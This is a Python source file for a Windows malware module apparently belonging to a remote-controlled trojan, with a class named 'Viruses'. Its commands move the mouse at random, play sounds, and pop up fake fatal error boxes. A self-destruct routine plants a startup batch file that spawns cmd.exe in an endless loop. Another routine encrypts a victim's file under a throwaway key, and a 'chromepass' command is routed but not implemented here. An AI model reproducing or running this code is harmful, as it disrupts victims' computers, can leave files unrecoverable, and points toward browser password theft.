import os
import time
import psutil
import random
import ctypes
import requests
import threading
import pyautogui as pag
from bs4 import BeautifulSoup
from playsound import playsound
from cryptography.fernet import Fernet

class Viruses:
    def __init__(self, cmd, cmd_split):
        self.cmd = cmd
        self.cmd_split = cmd_split
        self.threads_on = True
        self.fernet = Fernet(Fernet.generate_key())
    
    def check_cmds(self):
        output = 0

        if self.cmd_split[0] == "mw":
            threading.Thread(target=self.mouse_wiggle).start()
        elif self.cmd_split[0] == "soo":
            threading.Thread(target=self.sound_on_open).start()
        elif self.cmd_split[0] == "dlp":
            threading.Thread(target=self.dlp).start()
        elif self.cmd_split[0] == "errwin":
            threading.Thread(target=self.error_windows).start()
        elif self.cmd_split[0] == "si":
            threading.Thread(target=self.sound_interval).start()
        elif self.cmd == "selfdestruct":
            self.self_destruct()
        elif self.cmd_split[0] == "encrypt":
            self.encrypt()
        elif self.cmd_split[0] == "decrypt":
            return 0, self.cmd_split[0]
        elif self.cmd_split[0] == "chromepass":
            return output, self.cmd
        elif self.cmd == "stop":
            return output, self.cmd
        else:
            output = 1

        return output, self.cmd_split[0]

    def dlp(self):
        arg = self.cmd_split[1].replace("_", "+")
        url = f"https://www.google.com/search?q={arg}&client=avast-a-1&sxsrf=AOaemvK1gLoyCGV7T7qQfkjVxCc2eK8FiA:1630280560874&source=lnms&tbm=isch&sa=X&ved=2ahUKEwie5duttNfyAhWJRzABHeHiCmEQ_AUoAXoECAEQAw&biw=1920&bih=947"
        chars = "1234567890qwertyuiopasdfghjklzxcvbnm"
        r = requests.get(url)
        soup = BeautifulSoup(r.text, "html.parser")
        images = soup.find_all("img")
        image_src = []

        for i, v in enumerate(images):
            filename = ""
            for _ in range(10):
                filename += random.choice(chars)
            filename += ".png"

            if i > random.randint(1, 10) and i < random.randint(10, 20):
                with open(filename, "wb") as f:
                    try:
                        img = requests.get(v["src"]).content
                        f.write(img)
                        image_src.append(filename)
                        os.startfile(filename)
                    except:
                        pass
        
        while True:
            if self.threads_on == False:
                os.system("taskkill /F /IM PhotosApp.exe")
                for x in image_src:
                    try:
                        os.remove(x)
                    except:
                        pass
                break
    
    def error_windows(self):
        errs = [
            "ERROR_ARENA_TRASHED 7 (0x7) The storage control blocks were destroyed.",
            "ERROR_NOT_ENOUGH_MEMORY 8 (0x8) Not enough memory resources are available to process this command.",
            "ERROR_INVALID_BLOCK 9 (0x9) The storage control block address is invalid.",
            "ERROR_BAD_ENVIRONMENT 10 (0xA) The environment is incorrect.",
            "ERROR_BAD_FORMAT 11 (0xB) An attempt was made to load a program with an incorrect format.",
            "ERROR_INVALID_ACCESS 12 (0xC) The access code is invalid.",
            "ERROR_INVALID_DATA 13 (0xD) The data is invalid",
            "ERROR_OUTOFMEMORY 14 (0xE) Not enough storage is available to complete this operation.",
            "ERROR_INVALID_DRIVE 15 (0xF) The system cannot find the drive specified.",
            "ERROR_CURRENT_DIRECTORY 16 (0x10) The directory cannot be removed.",
            "ERROR_NOT_SAME_DEVICE 17 (0x11) The system cannot move the file to a different disk drive.",
            "ERROR_NO_MORE_FILES 18 (0x12) There are no more files.",
            "ERROR_WRITE_PROTECT 19 (0x13) The media is write protected.",
            "ERROR_BAD_UNIT 20 (0x14) The system cannot find the device specified.",
            "ERROR_NOT_READY 21 (0x15) The device is not ready.",
            "ERROR_BAD_COMMAND 22 (0x16) The device does not recognize the command.",
            "ERROR_CRC 23 (0x17) Data error (cyclic redundancy check).",
            "ERROR_BAD_LENGTH 24 (0x18) The program issued a command but the command length is incorrect.",
        ]
        
        for _ in range(int(self.cmd_split[1])):
            if self.threads_on:
                ctypes.windll.user32.MessageBoxW(0, random.choice(errs), "Fatal Error", 0x0 | 0x10)
            else:
                break

    def self_destruct(self):
        sd_dir = fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sd.bat"
        with open(sd_dir, "w") as f:
            f.write(
                ":start\n" +
                "start cmd.exe\n" +
                "goto start"
            )
        
        ctypes.windll.user32.MessageBoxW(0, "Self Destructing", "Say Goodbye :)", 0x0 | 0x10)
        time.sleep(5)
        os.startfile(sd_dir)

    def encrypt(self):
        for _ in range(5):
            with open(self.cmd_split[1], "rb") as f:
                contents = f.read()
            with open(self.cmd_split[1], "wb") as f:
                f.write(b"")
                f.write(self.fernet.encrypt(contents))

    def decrypt(self, file, fernet):
        for _ in range(5):
            with open(file, "rb") as f:
                contents = f.read()
            with open(file, "wb") as f:
                f.write(b"")
                f.write(fernet.decrypt(contents))

    def sound_on_open(self):
        while self.threads_on:
            for proc in psutil.process_iter():
                try:
                    if proc.name() == self.cmd_split[2]:
                        playsound(self.cmd_split[3])
                        break
                except:
                    pass
            time.sleep(int(self.cmd_split[1]))

    def mouse_wiggle(self):
        while self.threads_on:
            intensity = int(self.cmd_split[1].strip())
            pag.moveRel(random.randint(-intensity, intensity), 
                        random.randint(-intensity, intensity))

    def sound_interval(self):
        while self.threads_on:
            playsound(self.cmd_split[2])
            time.sleep(int(self.cmd_split[1]))